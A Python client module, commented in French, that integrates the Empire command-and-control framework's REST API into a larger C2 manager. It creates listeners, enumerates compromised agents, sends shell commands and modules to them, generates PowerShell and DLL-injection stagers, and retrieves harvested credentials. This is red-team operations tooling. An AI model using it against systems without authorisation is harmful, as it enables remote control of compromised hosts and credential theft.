"""
Empire C2 (BC-SECURITY) — Intégration REST API v2 complète.

Protocole : REST API (FastAPI, port 1337 par défaut)
Auth      : Bearer JWT via POST /token
Swagger   : http://host:1337/docs

Endpoints clés :
  POST /token                           → login (form-data : username/password)
  GET  /api/v2/agents                   → liste des agents
  GET  /api/v2/agents/{agent_name}      → détail agent
  GET  /api/v2/listeners                → liste des listeners
  POST /api/v2/listeners                → créer listener
  DELETE /api/v2/listeners/{id}         → supprimer listener
  POST /api/v2/stagers                  → générer stager/payload
  GET  /api/v2/stagers                  → liste des stagers
  GET  /api/v2/modules                  → liste des modules
  POST /api/v2/agents/{name}/tasks/shell → shell task
  POST /api/v2/agents/{name}/tasks/module → module task
  GET  /api/v2/agents/{name}/tasks      → historique des tasks
  GET  /api/v2/credentials              → credentials harvestés
  GET  /api/v2/reporting/logs           → logs opérations
"""
from __future__ import annotations

import asyncio
import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class EmpireC2(RestC2Interface):
    """Intégration Empire BC-SECURITY via REST API v2."""

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_modules", "execute_module",
        "list_credentials", "stager_generation",
    ]

    # ── Auth ─────────────────────────────────────────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        """Empire utilise form-data pour /token, pas JSON."""
        async with httpx.AsyncClient(
            base_url=config.base_url, verify=False, timeout=15.0
        ) as client:
            resp = await client.post(
                "/token",
                data={
                    "username": config.username or "empireadmin",
                    "password": config.password or "",
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )
            if resp.status_code not in (200, 201):
                raise C2AuthError(
                    f"Empire auth échouée [{resp.status_code}]: {resp.text[:200]}"
                )
            data = resp.json()
            token = data.get("access_token")
            if not token:
                raise C2AuthError(f"Token absent : {data}")
            logger.info("Empire : authentifié (token %s…)", token[:12])
            return token

    async def get_status(self) -> C2Status:
        if not self._client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._client.get("/api/v2/agents", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Listeners ────────────────────────────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        listener_type = config.get("type", "http").lower()
        name  = config.get("name", f"empire-{listener_type}-{uuid.uuid4().hex[:6]}")
        host  = config.get("bind_host", "0.0.0.0")
        port  = int(config.get("bind_port", 80))

        # Mapping type → template Empire
        template_map = {
            "http":  "http",
            "https": "http",
            "http2": "http",
            "smb":   "smb",
            "meterpreter": "meterpreter",
        }
        template = template_map.get(listener_type, "http")

        body: dict[str, Any] = {
            "name":     name,
            "template": template,
            "options": {
                "Host":    f"http{'s' if listener_type == 'https' else ''}://{host}:{port}",
                "Port":    str(port),
                "BindIP":  host,
            },
        }
        if listener_type == "https":
            body["options"]["StagingKey"] = config.get("staging_key", "")

        data = await self._post("/api/v2/listeners", json=body)
        listener_id = str(data.get("id", uuid.uuid4()))

        return Listener(
            id=listener_id,
            name=data.get("name", name),
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=listener_type,
            status="running" if data.get("enabled") else "stopped",
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._delete(f"/api/v2/listeners/{listener_id}")
            return True
        except Exception as exc:
            logger.error("Empire remove_listener échoué : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data = await self._get("/api/v2/listeners")
        listeners = []
        for item in data.get("records", []):
            opts = item.get("options", {})
            host_opt = opts.get("Host", {}).get("value", "http://0.0.0.0:80")
            port = int(opts.get("Port", {}).get("value", 80))
            listeners.append(Listener(
                id=str(item.get("id", uuid.uuid4())),
                name=item.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=opts.get("BindIP", {}).get("value", "0.0.0.0"),
                bind_port=port,
                protocol=item.get("template", "http"),
                status="running" if item.get("enabled") else "stopped",
            ))
        return listeners

    # ── Agents ───────────────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data = await self._get("/api/v2/agents")
        agents = []
        for a in data.get("records", []):
            checkin = a.get("lastseen_time", "")
            try:
                checkin_dt = datetime.fromisoformat(checkin)
            except (ValueError, TypeError):
                checkin_dt = datetime.utcnow()

            hi = a.get("high_integrity", "")
            if hi is True or (isinstance(hi, str) and "high" in hi.lower()):
                integrity = "ADMIN"
            elif hi is False or not hi:
                integrity = "USER"
            else:
                integrity = "SYSTEM"

            agents.append(Implant(
                id=a.get("name", str(uuid.uuid4())),
                name=a.get("name", ""),
                c2_type=self._config.c2_type,
                listener_id=a.get("listener", ""),
                external_ip=a.get("external_ip", ""),
                internal_ip=a.get("internal_ip", ""),
                hostname=a.get("hostname", ""),
                username=a.get("username", ""),
                os=a.get("os_details", ""),
                arch=a.get("architecture", ""),
                pid=int(a.get("process_id", 0)),
                process_name=a.get("process_name", ""),
                integrity=integrity,
                last_checkin=checkin_dt,
                active=not a.get("stale", True),
            ))
        return agents

    # ── Tâches ───────────────────────────────────────────────────────────────

    async def send_task(
        self,
        agent_id: str,
        command: str,
        args: list[str] | None = None,
    ) -> Task:
        self._require_connected()
        task_id = str(uuid.uuid4())
        full_cmd = command + (" " + " ".join(args) if args else "")

        data = await self._post(
            f"/api/v2/agents/{agent_id}/tasks/shell",
            json={"command": full_cmd},
        )

        return Task(
            id=str(data.get("id", task_id)),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=full_cmd,
            args=args or [],
            status=data.get("status", "sent"),
        )

    async def execute_module(
        self,
        agent_id: str,
        module_name: str,
        options: dict[str, Any],
    ) -> Task:
        """Exécuter un module Empire sur un agent."""
        self._require_connected()
        data = await self._post(
            f"/api/v2/agents/{agent_id}/tasks/module",
            json={
                "module_name": module_name,
                "options": {k: {"value": v} for k, v in options.items()},
                "ignore_language_version_check": True,
                "ignore_admin": False,
            },
        )
        return Task(
            id=str(data.get("id", uuid.uuid4())),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=f"module:{module_name}",
            status=data.get("status", "sent"),
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        # Empire : les résultats sont dans l'historique agent
        # On suppose que task_id est "agent_name/task_id"
        parts = task_id.split("/")
        if len(parts) == 2:
            agent_name, tid = parts
            data = await self._get(f"/api/v2/agents/{agent_name}/tasks/{tid}")
            return {
                "task_id": tid,
                "status":  data.get("status"),
                "result":  data.get("output", ""),
            }
        return {"task_id": task_id, "status": "unknown"}

    async def get_task_history(self, agent_id: str) -> list[dict[str, Any]]:
        """Historique complet des tâches pour un agent."""
        self._require_connected()
        data = await self._get(
            f"/api/v2/agents/{agent_id}/tasks",
            params={"limit": 100, "order_by": "id", "order_direction": "desc"},
        )
        return data.get("records", [])

    # ── Payload / Stager ─────────────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()

        # Mapping format → template Empire
        template_map = {
            "ps1":       "multi/launcher",
            "exe":       "windows/launcher_bat",
            "python":    "multi/launcher",
            "py":        "multi/launcher",
            "dll":       "windows/dll_injection",
        }
        template = config.extra.get("template", template_map.get(config.format, "multi/launcher"))
        language = config.extra.get("language", "powershell")

        data = await self._post(
            "/api/v2/stagers",
            json={
                "template": template,
                "options": {
                    "Listener": {"value": config.listener_id},
                    "Language": {"value": language},
                    "OutFile":  {"value": config.name},
                    "SafeChecks": {"value": "True"},
                    "UserAgent": {"value": "Mozilla/5.0"},
                },
            },
        )
        output = data.get("output", "")
        return output.encode() if isinstance(output, str) else (output or b"")

    # ── Credentials & Modules ─────────────────────────────────────────────────

    async def list_credentials(self) -> list[dict[str, Any]]:
        """Récupère les credentials harvestés."""
        self._require_connected()
        data = await self._get("/api/v2/credentials")
        return data.get("records", [])

    async def list_modules(self, search: str = "") -> list[dict[str, Any]]:
        """Liste les modules Empire disponibles."""
        self._require_connected()
        params = {"search": search} if search else {}
        data = await self._get("/api/v2/modules", params=params)
        return data.get("records", [])

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
